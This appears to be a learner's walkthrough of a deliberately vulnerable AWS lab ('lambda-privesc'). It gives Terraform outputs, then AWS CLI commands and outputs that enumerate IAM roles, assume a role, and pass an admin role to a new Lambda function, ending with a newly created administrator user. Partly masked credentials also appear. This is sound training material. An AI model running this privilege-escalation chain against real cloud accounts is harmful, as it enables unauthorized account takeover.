aws_account_id = "818310590470"
chris_access_key_id = "AK...........26I"
chris_secret_access_key = <sensitive>
chris_username = "chris-lambda_privesc"
debug_role_arn = "arn:aws:iam::818310590470:role/debug-role-lambda_privesc"
lambda_manager_role_arn = "arn:aws:iam::818310590470:role/lambdaManager-role-lambda_privesc"
scenario_goal = "Acquire full admin privileges starting as the low-privileged 'chris' user"
scenario_name = "lambda-privesc"
start_instructions = <<EOT



TO BEGIN:
1. Configure AWS CLI with chris's credentials:
   aws configure --profile chris
       
2. Verify your identity:
   aws sts get-caller-identity --profile chris
    
3. Start exploring! Hints:
   - What policies does chris have?
   - What roles exist in this account?
   - Can chris assume any roles?
    
To get chris's secret key, run:
   terraform output -raw chris_secret_access_key
    
===================================





**IAM Enumeration**: How attackers discover permissions and roles in an AWS environment
2. **Role Assumption**: Using `sts:AssumeRole` to gain additional permissions
3. **Lambda Privilege Escalation**: Exploiting overly permissive Lambda execution roles
4. **IAM PassRole Abuse**: How `iam:PassRole` can be leveraged for privilege escalation



1. aws iam list-roles --query 'Roles[].RoleName' --output json | jq -r '.[]'     
AWSServiceRoleForOrganizations
AWSServiceRoleForResourceExplorer
AWSServiceRoleForSSO
AWSServiceRoleForSupport
AWSServiceRoleForTrustedAdvisor
debug-role-lambda_privesc
lambdaManager-role-lambda_privesc

2. aws iam list-attached-user-policies --user-name chris-lambda_privesc --output json
AttachedPolicies": [
        {
            "PolicyName": "chris-policy-lambda_privesc",
            "PolicyArn": "arn:aws:iam::818310590470:policy/chris-policy-lambda_privesc"
        }
    ]

3.aws iam get-role --role-name lambdaManager-role-lambda_privesc --query 'Role.AssumeRolePolicyDocument' --output json

"Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::818310590470:user/chris-lambda_privesc"
            },
            "Action": "sts:AssumeRole"
        }
    ]

    4.aws sts assume-role \
  --role-arn arn:aws:iam::818310590470:role/lambdaManager-role-lambda_privesc \
  --role-session-name chris-session

  "Credentials": {
        "AccessKeyId": "ASIA3...........KIXM",
        "SecretAccessKey": "R+.....YAO",
        "SessionToken": "IQoJb3JpZ2l..............2d2rwSda3+gHsoGMB8SvNm38MOjc/8sGOpwBweZhoV5hqqHOIncIrWDV/iGxenb1qgRSSF6/ix6/OjSRVkKUuerDjru2tH2F4y34iATipcwwL7jyomPWvXEpqUVBWquYWqTnb7Dvg3q8ibK8YgdDoXnQC/zkI/fXLkGoKGvZqhs7nDT8i3dMPDH13agGublYzuf5yNdX6nIG6wHnYxj21A9VBX/z71wWipUJNV5DrkS+3Zm0IM3j",
        "Expiration": "2026-02-02T01:23:04+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA35BY4WADAOLX4YCJU:chris-session",
        "Arn": "arn:aws:sts::818310590470:assumed-role/lambdaManager-role-lambda_privesc/chris-session"
    }
}

5. aws iam list-roles | grep -i debug
    "RoleName": "debug-role-lambda_privesc",
    "Arn": "arn:aws:iam::818310590470:role/debug-role-lambda_privesc",

6.aws iam get-role --role-name debug-role-lambda_privesc
..."RoleName": "debug-role-lambda_privesc",
        "RoleId": "AROA35BY4WADFHMXTOG7Q",
        "Arn": "arn:aws:iam::818310590470:role/debug-role-lambda_privesc",
        ...

7.aws iam list-attached-role-policies --role-name debug-role-lambda_privesc

{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}

5.aws sts assume-role --role-arn arn:aws:iam::818310590470:role/lambdaManager-role-lambda_privesc --role-session-name chris-session 

export creds:
export AWS_ACCESS_KEY_ID="ASIA35.......DNWJ7SEDU"
export AWS_SECRET_ACCESS_KEY="Ogvfn.......yhIfmvxonrFe9Nbo"
export AWS_SESSION_TOKEN="IQo..................VQUAO2HNKdpGJjCm"


6. aws sts get-caller-identity

{
    "UserId": "AROA35BY4WADAOLX4YCJU:chris-session",
    "Account": "818310590470",
    "Arn": "arn:aws:sts::818310590470:assumed-role/lambdaManager-role-lambda_privesc/chris-session"
}

7.aws lambda create-function \
  --function-name chris-privilege-escalation \
  --runtime python3.12 \
  --role arn:aws:iam::818310590470:role/debug-role-lambda_privesc \
  --handler lambda.lambda_handler \
  --zip-file fileb://lambda_function.zip \
  --timeout 30
  

  8. aws lambda invoke \         
  --function-name chris-privilege-escalation \
  response.json 
 

 9.

  export AWS_ACCESS_KEY_ID="AKIA35BY4.....Q2O6I"
export AWS_SECRET_ACCESS_KEY="4ZOot490........9reDmlFh"
unset AWS_SESSION_TOKEN

10. aws iam list-users
{
            "Path": "/",
            "UserName": "chris-pwned-admin",
            "UserId": "AIDA35BY4WADLLYTM2J7P",
            "Arn": "arn:aws:iam::818310590470:user/chris-pwned-admin",
            "CreateDate": "2026-02-02T01:50:13+00:00"

11 .aws iam list-attached-user-policies --user-name chris-pwned-admin
            {
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}